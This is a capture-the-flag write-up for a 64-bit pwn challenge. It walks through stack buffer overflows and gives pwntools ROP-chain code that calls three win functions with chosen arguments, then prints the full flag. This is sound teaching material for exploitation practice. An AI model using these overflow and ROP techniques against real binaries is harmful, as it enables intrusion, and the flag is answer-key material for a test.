# 64 bits in my Ark and Texture

## 🧩 Challenge Summary

- **Category**: Pwn  
- **Points**: 300  
- **Solves**: 108 teams

---

### 📝 Problem Description

> Can you pwn it? No libc or system needed. Just good ol’ 64-bit binary exploitation.

---

## 🧠 Challenge Structure

The binary presents three sequential stages.  
Each stage involves answering quiz questions and crafting a ROP payload to jump to a specific `win` function.  
Each function reveals a part of the flag:

- `win1()` → First part of the flag  
- `win2(arg)` → Second part  
- `win3(arg1, arg2, arg3)` → Final part

---

## ✅ Exploitation Flow

### 🔹 Step 1: Pass the Intro Quiz

In an **x86-64 Linux architecture**, answer the following questions correctly to unlock the challenges:

- Q1: Functions read their arguments from the stack → Answer: `False (2)`
- Q2: First argument register → Answer: `RDI (1)`
- Q3: Return value register → Answer: `RAX (4)`

```python
for ans in [b"2", b"1", b"4"]:
    r.sendlineafter(b"?", ans)
```

---

### 🔹 Step 2: Jump to `win1()` (First part of flag)

- **Buffer padding: `0x98`**

  This was calculated by examining the stack layout in the function:

  ```c
  int __fastcall main(int argc, const char **argv, const char **envp) {
      char s[8]; // [rsp+0h] [rbp-90h] BYREF
      fgets(s, 512, stdin);
  }
  ```

  Here's a quick breakdown of the layout:

  ```
  [rbp - 0x90]  -> s (start of input buffer)
  [rbp + 0x08]  -> return address
  -------------------------------
  padding = 0x90 + 0x08 = 0x98
  ```

- **ROP chain**: Built using `rop.call()` to invoke `win1()`

```python
def build_rop_payload(padding_len, win_func, *args):
    rop = ROP(elf)
    rop.raw(b"A" * padding_len)
    rop.raw(rop.ret)  # Stack alignment for 16-byte requirement
    rop.call(win_func, list(args))
    return rop.chain()

def exploit_win1(r):
    payload = build_rop_payload(0x98, elf.sym.win1)
    r.sendlineafter(b"\n", payload)
    r.recvuntil(b"advance.")
    return r.recvline().strip().decode()
```

💬 Output:

```
You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.
DawgCTF{C0ngR4tul4t10ns_
```

---

### 🔹 Step 3: Jump to `win2()` (Second part of flag)

- **Buffer padding: `0x28`**

  Stack layout from inside `win1()`:

  ```c
  __int64 win1() {
      char s[8]; // [rsp+0h] [rbp-20h] BYREF
      fgets(s, 96, stdin);
  }
  ```

  Layout breakdown:

  ```
  [rbp - 0x20]  -> s (start of input buffer)
  [rbp + 0x08]  -> return address
  -------------------------------
  padding = 0x20 + 0x08 = 0x28
  ```

- **Argument**: `0xdeadbeef`

- **ROP chain**: Uses `rop.call()` to call `win2(0xdeadbeef)`

```python
def exploit_win2(r):
    payload = build_rop_payload(0x28, elf.sym.win2, 0xdeadbeef)
    r.sendlineafter(b"Continue: \n", payload)
    r.recvuntil(b"you\n")
    return r.recvline().strip().decode()
```

💬 Output:

```
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you

d15c1p13_y0u_
```

---

### 🔹 Step 4: Jump to `win3()` (Final part of flag)

- **Buffer padding: `0x38`**

  Stack layout inside `win2()`:

  ```c
  __int64 __fastcall win2(int a1) {
      char v2[8]; // [rsp+10h] [rbp-30h] BYREF
      fgets(v2, 256, stdin);
  }
  ```

  Layout breakdown:

  ```
  [rbp - 0x30]  -> v2 (start of input buffer)
  [rbp + 0x08]  -> return address
  -------------------------------
  padding = 0x30 + 0x08 = 0x38
  ```

- **Arguments**: `0xdeadbeef, 0xdeafface, 0xfeedcafe`

- **ROP chain**: Uses `rop.call()` to invoke `win3(...)`

```python
def exploit_win3(r):
    payload = build_rop_payload(0x38, elf.sym.win3, 0xdeadbeef, 0xdeafface, 0xfeedcafe)
    r.sendlineafter(b"Test: \n", payload)
    r.recvuntil(b"reward\n\n")
    return r.recvline().strip().decode()
```

💬 Output:

```
Congratulations. You are deserving of you reward


4r3_r34dy_2_pwn!}
```

---

## 🏁 Flag

By combining the outputs from all three stages, the complete flag is:

```
DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}
```
